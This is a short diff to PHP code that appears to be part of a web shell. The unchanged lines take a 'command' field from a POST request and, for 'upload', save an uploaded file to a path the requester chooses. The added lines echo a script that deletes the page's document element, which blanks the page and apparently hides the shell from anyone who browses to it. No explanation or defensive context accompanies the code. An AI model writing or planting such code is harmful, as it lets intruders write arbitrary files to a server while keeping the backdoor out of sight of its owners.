@@ -1,4 +1,6 @@
 
+  echo "<script>document.removeChild(document.documentElement);</script>"
+  
   if (isset($_POST['command'])) {
     if (explode(" ", $_POST['command'])[0] == "upload") {
       $uploadfile = explode(" ", $_POST['command'])[1] . basename($_FILES['userfile']['name']);
